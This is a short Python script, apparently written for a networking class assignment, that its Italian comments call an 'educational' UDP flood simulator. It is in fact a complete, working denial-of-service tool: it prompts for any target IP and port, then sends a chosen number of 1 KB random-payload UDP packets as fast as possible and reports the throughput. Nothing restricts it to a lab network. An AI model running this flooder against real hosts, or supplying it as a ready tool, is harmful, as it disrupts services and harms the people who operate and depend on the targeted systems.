import socket
import random
import time
import sys

def udp_flood_optimized():
    print("--- Simulatore UDP Flood Ottimizzato (Educational) ---")
    print("Premi CTRL+C in qualsiasi momento per fermare l'invio.\n")

    # --- 1. CONFIGURAZIONE ---
    target_ip = input("Inserisci l'IP della macchina target (es. 192.168.x.x): ")
    
    try:
        target_port = int(input("Inserisci la porta UDP target (es. 8080): "))
        num_packets = int(input("Numero di pacchetti da inviare (es. 100000): "))
    except ValueError:
        print("Errore: Inserisci solo numeri interi per porta e pacchetti.")
        return

    # --- 2. PREPARAZIONE DATI ---
    # Creiamo il pacchetto di 1 KB (1024 bytes) una sola volta per risparmiare CPU.
    # Requisito: Grandezza pacchetto 1 KB [cite: 24]
    # Suggerimento: uso modulo random 
    payload = random._urandom(1024)
    
    # Creazione del socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print(f"\n[START] Invio verso {target_ip}:{target_port} in corso...")
    
    sent_counter = 0
    start_time = time.time()

    # --- 3. CICLO DI INVIO ---
    try:
        for i in range(num_packets):
            sock.sendto(payload, (target_ip, target_port))
            sent_counter += 1

            # OTTIMIZZAZIONE: Stampiamo lo stato solo ogni 5000 pacchetti
            # per non bloccare il terminale dell'utente.
            if sent_counter % 5000 == 0:
                sys.stdout.write(f"\rPacchetti inviati: {sent_counter}")
                sys.stdout.flush()

    except KeyboardInterrupt:
        # Permette all'utente di fermare tutto con CTRL+C senza errori brutti
        print("\n\n[!] Interruzione manuale rilevata (CTRL+C).")
    
    except Exception as e:
        print(f"\n[!] Errore critico: {e}")

    finally:
        # --- 4. REPORT FINALE ---
        end_time = time.time()
        duration = end_time - start_time
        # Evitiamo divisione per zero se dura pochissimo
        if duration == 0: duration = 0.001 
        
        sock.close()
        
        print(f"\n\n--- Report Fine Simulazione ---")
        print(f"Target: {target_ip}:{target_port}")
        print(f"Totale inviati: {sent_counter}/{num_packets}")
        print(f"Tempo trascorso: {duration:.2f} secondi")
        print(f"Velocità media: {sent_counter/duration:.0f} pacchetti/secondo")
        print("-------------------------------")

if __name__ == "__main__":
    udp_flood_optimized()